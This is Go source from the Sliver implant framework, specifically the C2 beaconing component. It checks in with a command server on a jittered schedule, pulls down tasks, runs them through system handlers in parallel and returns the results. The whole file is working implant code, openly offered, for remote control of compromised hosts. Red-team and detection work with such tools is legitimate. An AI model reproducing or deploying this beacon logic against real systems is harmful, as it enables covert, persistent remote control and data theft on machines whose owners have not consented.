package c2

/*
   Sliver Implant Framework
   Copyright (C) 2019  Bishop Fox

   This program is free software: you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation, either version 3 of the License, or
   (at your option) any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"errors"
	insecureRand "math/rand"
	"sync"
	"time"

	"github.com/gofrs/uuid"
	"github.com/golang/protobuf/proto"

	"github.com/bishopfox/sliver/implant/sliver/handlers"
	"github.com/bishopfox/sliver/implant/sliver/transports"
	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
)

// BeaconID - A unique ID for the entire lifetime of this
// session as beacon: might need to change this way to proceed.
var BeaconID string

func init() {
	id, err := uuid.NewV4()
	if err != nil {
		BeaconID = "00000000-0000-0000-0000-000000000000"
	}
	BeaconID = id.String()
}

// ServeBeacon - Loop and continuously perform
// beaconing according to the transport settings.
func (t *C2) ServeBeacon() {

	// Create a new beacon base type, which is passed to specialized C2 channels
	t.mutex.RLock()
	t.Beacon = &beacon{
		interval:   t.Profile.Interval,
		jitter:     t.Profile.Jitter,
		connection: t.Connection,
		wg:         &sync.WaitGroup{},
	}
	t.mutex.RUnlock()

	for {
		// Only exit when we have reached the maximum number
		// of connection failures for this precise beaconing
		// Warn the transports that we are exhausted
		if t.failures > int(t.Profile.MaxConnectionErrors) {
			Transports.transportErrors <- ErrMaxAttempts
			return
		}

		// Get a new duration for this coming beaconing.
		duration := t.Duration()

		// Run a beaconing process (connect, set up RPC, process tasks)
		// In the background so that if tasks do not complete, does not
		// block any next runs and their associated tasks.
		go t.HandleBeaconTasks(duration)

		// {{if .Config.Debug}}
		log.Printf("[beacon] sleep until %v", time.Now().Add(duration))
		// {{end}}

		// Wait until either:
		select {
		case <-t.closed: // The transport has been shutdown by a user
			t.Beacon.wg.Wait()     // Wait for all beaconing runs to complete
			t.closed <- struct{}{} // And acklowledge we're closed

		case <-time.After(duration): // The beaconing interval has elapsed
			t.Beacon.wg.Wait() // Wait for all beaconing runs to complete
			// TODO: This defeats the whole point of running beacons
			// in a goroutine, but for now there is a problem with
			// underlying connection access synchronization.
		}
	}
	// {{if .Config.Debug}}
	log.Printf("[beacon] Exiting beaconing loop")
	// {{end}}
}

// HandleBeaconTasks - Listens for tasks, executes them and sends the results in the background,
func (t *C2) HandleBeaconTasks(duration time.Duration) {

	// Notify a routine is owning the underlying connection stack, no one
	// should either restart it or shut any of its components down.
	t.Beacon.wg.Add(1)
	defer t.Beacon.wg.Done()

	// Setup the physical connection if needed (will return without errors if not)
	err := t.startTransport()
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Error starting connection: %s", err)
		// {{end}}
		return
	}

	// Setup the session connection. This is always needed
	err = t.StartSession()
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Error setting up connection: %s", err)
		// {{end}}
		return
	}

	// Recreate a new, clean session layer when we use beacons.
	t.Beacon.connection = t.Connection
	defer t.Beacon.connection.Close()

	// {{if .Config.Debug}}
	log.Printf("[beacon] sending check in ...")
	// {{end}}
	nextCheckin := time.Now().Add(duration)
	t.Beacon.Send(Envelope(pb.MsgBeaconTasks, &pb.BeaconTasks{
		ID:          BeaconID,
		NextCheckin: nextCheckin.UTC().Unix(),
	}))

	// At this point, we don't increase the number of failed attempts, because the issue
	// is clearly not a connectivity issue (the whole C2 stack is set up and should be fine)

	// {{if .Config.Debug}}
	log.Printf("[beacon] recv task(s) ...")
	// {{end}}
	envelope, err := t.Beacon.Recv()
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[beacon] recv failure %s", err)
		// {{end}}
		return
	}
	tasks := &pb.BeaconTasks{}
	err = proto.Unmarshal(envelope.Data, tasks)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[beacon] unmarshal failure %s", err)
		// {{end}}
		return
	}
	// {{if .Config.Debug}}
	log.Printf("[beacon] received %d task(s) from server", len(tasks.Tasks))
	// {{end}}
	if len(tasks.Tasks) == 0 {
		return
	}

	// Start executing all tasks concurrently, and wait until they complete.
	results := t.ExecuteBeaconTasks(tasks.Tasks)

	// {{if .Config.Debug}}
	log.Printf("[beacon] all tasks completed, sending results to server")
	// {{end}}

	err = t.Beacon.Send(Envelope(pb.MsgBeaconTasks, &pb.BeaconTasks{
		ID:    BeaconID,
		Tasks: results,
	}))
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[beacon] error sending results %s", err)
		// {{end}}
	}
	// {{if .Config.Debug}}
	log.Printf("[beacon] all results sent to server, cleanup ...")
	// {{end}}
}

// ExecuteBeaconTasks - Concurrently performs all the tasks in a request and
// populate the results. This blocks until all goroutines have finished.
func (t *C2) ExecuteBeaconTasks(tasks []*pb.Envelope) (results []*pb.Envelope) {
	wg := &sync.WaitGroup{}
	resultsMutex := &sync.Mutex{}

	// Register commands compatible with beacons.
	sysHandlers := handlers.GetSystemHandlers()

	for _, task := range tasks {
		// {{if .Config.Debug}}
		log.Printf("[beacon] execute task %#d", task.ID)
		log.Printf("         Type          %d", task.Type)
		// {{end}}
		if handler, ok := sysHandlers[task.Type]; ok {
			wg.Add(1)
			data := task.Data
			taskID := task.ID
			go handler(data, func(data []byte, err error) {
				resultsMutex.Lock()
				defer resultsMutex.Unlock()
				defer wg.Done()
				// {{if .Config.Debug}}
				if err != nil {
					log.Printf("[beacon] handler function returned an error: %s", err)
				}
				log.Printf("[beacon] task completed (id: %d)", taskID)
				// {{end}}
				results = append(results, &pb.Envelope{
					ID:   taskID,
					Data: data,
				})
			})
		} else if handler, ok := transportHandlers[task.Type]; ok {
			wg.Add(1)
			data := task.Data
			taskID := task.ID
			go handler(data, func(data []byte, err error) {
				resultsMutex.Lock()
				defer resultsMutex.Unlock()
				defer wg.Done()
				// {{if .Config.Debug}}
				if err != nil {
					log.Printf("[beacon] handler function returned an error: %s", err)
				}
				log.Printf("[beacon] task completed (id: %d)", taskID)
				// {{end}}
				results = append(results, &pb.Envelope{
					ID:   taskID,
					Data: data,
				})
			})
		} else {
			resultsMutex.Lock()
			results = append(results, &pb.Envelope{
				ID:                 task.ID,
				UnknownMessageType: true,
			})
			resultsMutex.Unlock()
		}
	}
	// {{if .Config.Debug}}
	log.Printf("[beacon] waiting for task(s) to complete ...")
	// {{end}}
	wg.Wait()

	return
}

// beacon - base beaconing implementation: connection setup and orchestration logic
type beacon struct {
	interval   int64
	jitter     int64
	duration   time.Duration
	connection *transports.Connection
	wg         *sync.WaitGroup // synchronize access to the underlying connection/session
}

// Recv - Receive a a task from the server. Blocks until one is received.
func (b *beacon) Recv() (*pb.Envelope, error) {
	incoming := b.connection.RequestRecv()

	// Wait for and read one envelope and return
	for envelope := range incoming {
		if envelope == nil {
			return nil, errors.New("received nil envelope from underlying TLV connection")
		}
		return envelope, nil
	}
	return nil, errors.New("did not received any envelope in Recv call")
}

// Send - Send the results or part of a task output back to server. Not blocking
func (b *beacon) Send(envelope *pb.Envelope) error {
	b.connection.RequestSend(envelope)
	return nil
}

// Duration - Compute the duration needed for this transport
func (t *C2) Duration() time.Duration {
	p := t.Profile
	// {{if .Config.Debug}}
	log.Printf("Interval: %v Jitter: %v", p.Interval, p.Jitter)
	// {{end}}
	jitterDuration := time.Duration(0)
	if 0 < p.Jitter {
		jitterDuration = time.Duration(int64(insecureRand.Intn(int(p.Jitter))))
	}
	duration := time.Duration(p.Interval) + jitterDuration
	// {{if .Config.Debug}}
	log.Printf("Duration: %v", duration)
	// {{end}}
	return duration
}
